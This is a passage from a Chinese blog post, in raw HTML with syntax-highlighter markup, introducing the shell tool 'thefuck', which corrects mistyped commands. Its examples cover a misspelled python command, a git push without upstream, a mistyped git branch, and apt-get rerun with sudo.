的神器！</p>\n<p><em>当你的终端没有按你想象的输入命令时，请 <code>fuck</code> 它！</em></p>\n<p><em>当你的终端没有按你想象的以 sudo 执行命令时，请 <code>fuck</code> 它！</em></p>\n<p><em>当你的的终端不知道填上显而易见的参数时，请 <code>fuck</code> 它！</em></p>\n<p>当你输入错误的命令时：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f0762da475218476\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n➜ puthon\r\nNo command 'puthon' found, did you mean:\r\n Command 'python' from package 'python-minimal' (main)\r\n Command 'python' from package 'python3' (main)\r\nzsh: command not found: puthon\r\n\r\n➜ fuck\r\npython [enter/↑/↓/ctrl+c]\r\nPython 3.4.2 (default, Oct  8 2014, 13:08:17)\r\n...</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f0762da475218476-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762da475218476-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762da475218476-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762da475218476-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762da475218476-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762da475218476-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762da475218476-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762da475218476-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762da475218476-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762da475218476-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f0762da475218476-1\">➜<span class=\"crayon-h\"> </span><span class=\"crayon-e\">puthon</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762da475218476-2\"><span class=\"crayon-e\">No </span><span class=\"crayon-i\">command</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'puthon'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">found</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">did </span><span class=\"crayon-e\">you </span><span class=\"crayon-v\">mean</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762da475218476-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Command</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'python'</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'python-minimal'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">main</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762da475218476-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Command</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'python'</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'python3'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">main</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762da475218476-5\"><span class=\"crayon-v\">zsh</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">command </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">found</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">puthon</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762da475218476-6\"> </div><div class=\"crayon-line\" id=\"crayon-594b05f0762da475218476-7\">➜<span class=\"crayon-h\"> </span><span class=\"crayon-e\">fuck</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762da475218476-8\"><span class=\"crayon-i\">python</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">enter</span><span class=\"crayon-o\">/</span>↑<span class=\"crayon-o\">/</span>↓<span class=\"crayon-o\">/</span><span class=\"crayon-v\">ctrl</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762da475218476-9\"><span class=\"crayon-i\">Python</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.4.2</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-st\">default</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Oct</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2014</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">13</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762da475218476-10\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p>当你忘记输入参数时：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f0762e6397121500\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n➜ git push\r\nfatal: The current branch master has no upstream branch.\r\nTo push the current branch and set the remote as upstream, use\r\n\r\n    git push --set-upstream origin master\r\n\r\n➜ fuck\r\ngit push --set-upstream origin master [enter/↑/↓/ctrl+c]\r\nCounting objects: 9, done.\r\n...</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f0762e6397121500-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762e6397121500-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762e6397121500-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762e6397121500-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762e6397121500-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762e6397121500-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762e6397121500-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762e6397121500-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762e6397121500-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762e6397121500-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f0762e6397121500-1\">➜<span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-e\">push</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762e6397121500-2\"><span class=\"crayon-v\">fatal</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">The </span><span class=\"crayon-e\">current </span><span class=\"crayon-e\">branch </span><span class=\"crayon-e\">master </span><span class=\"crayon-e\">has </span><span class=\"crayon-e\">no </span><span class=\"crayon-e\">upstream </span><span class=\"crayon-v\">branch</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762e6397121500-3\"><span class=\"crayon-st\">To</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">push </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">current </span><span class=\"crayon-e\">branch </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">remote </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">upstream</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">use</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762e6397121500-4\"> </div><div class=\"crayon-line\" id=\"crayon-594b05f0762e6397121500-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">push</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">set</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">upstream </span><span class=\"crayon-e\">origin </span><span class=\"crayon-i\">master</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762e6397121500-6\"> </div><div class=\"crayon-line\" id=\"crayon-594b05f0762e6397121500-7\">➜<span class=\"crayon-h\"> </span><span class=\"crayon-e\">fuck</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762e6397121500-8\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">push</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">set</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">upstream </span><span class=\"crayon-e\">origin </span><span class=\"crayon-i\">master</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">enter</span><span class=\"crayon-o\">/</span>↑<span class=\"crayon-o\">/</span>↓<span class=\"crayon-o\">/</span><span class=\"crayon-v\">ctrl</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762e6397121500-9\"><span class=\"crayon-e\">Counting </span><span class=\"crayon-v\">objects</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">done</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762e6397121500-10\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0018 seconds] -->\r\n<p>当你输入错误的参数时：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f0762ed334959303\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n➜ git brnch\r\ngit: 'brnch' is not a git command. See 'git --help'.\r\n\r\nDid you mean this?\r\n    branch\r\n\r\n➜ fuck\r\ngit branch [enter/↑/↓/ctrl+c]\r\n* master</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f0762ed334959303-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762ed334959303-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762ed334959303-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762ed334959303-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762ed334959303-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762ed334959303-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762ed334959303-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762ed334959303-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762ed334959303-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f0762ed334959303-1\">➜<span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-e\">brnch</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762ed334959303-2\"><span class=\"crayon-v\">git</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'brnch'</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">command</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">See</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'git --help'</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762ed334959303-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762ed334959303-4\"><span class=\"crayon-e\">Did </span><span class=\"crayon-e\">you </span><span class=\"crayon-e\">mean </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">?</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762ed334959303-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">branch</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762ed334959303-6\"> </div><div class=\"crayon-line\" id=\"crayon-594b05f0762ed334959303-7\">➜<span class=\"crayon-h\"> </span><span class=\"crayon-e\">fuck</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762ed334959303-8\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">branch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">enter</span><span class=\"crayon-o\">/</span>↑<span class=\"crayon-o\">/</span>↓<span class=\"crayon-o\">/</span><span class=\"crayon-v\">ctrl</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762ed334959303-9\"><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">master</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>当你忘记输入 <code>sudo</code> 时：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f0762f1712648610\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n➜ apt-get install vim\r\nE: Could not open lock file /var/lib/dpkg/lock - open (13: Permission denied)\r\nE: Unable to lock the administration directory (/var/lib/dpkg/), are you root?\r\n\r\n➜ fuck\r\nsudo apt-get install vim [enter/↑/↓/ctrl+c]\r\n[sudo] password for nvbn:\r\nReading package lists... Done\r\n...</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f0762f1712648610-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762f1712648610-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762f1712648610-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762f1712648610-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762f1712648610-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762f1712648610-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762f1712648610-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762f1712648610-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762f1712648610-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f0762f1712648610-1\">➜<span class=\"crayon-h\"> </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">vim</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762f1712648610-2\"><span class=\"crayon-v\">E</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Could </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">open </span><span class=\"crayon-e\">lock </span><span class=\"crayon-v\">file</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dpkg</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lock</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">open</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">13</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Permission </span><span class=\"crayon-v\">denied</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762f1712648610-3\"><span class=\"crayon-v\">E</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Unable </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lock </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">administration </span><span class=\"crayon-e\">directory</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dpkg</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">are </span><span class=\"crayon-e\">you </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">?</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762f1712648610-4\"> </div><div class=\"crayon-line\" id=\"crayon-594b05f0762f1712648610-5\">➜<span class=\"crayon-h\"> </span><span class=\"crayon-e\">fuck</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762f1712648610-6\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">vim</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">enter</span><span class=\"crayon-o\">/</span>↑<span class=\"crayon-o\">/</span>↓<span class=\"crayon-o\">/</span><span class=\"crayon-v\">ctrl</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762f1712648610-7\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">sudo</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">password </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nvbn</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762f1712648610-8\"><span class=\"crayon-e\">Reading </span><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lists</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Done</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762f1712648610-9\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0022 seconds] -->\r\n<p>如果生活是如此的不如意，你可以不断的“教诲”它：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f0762f5931918018\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px 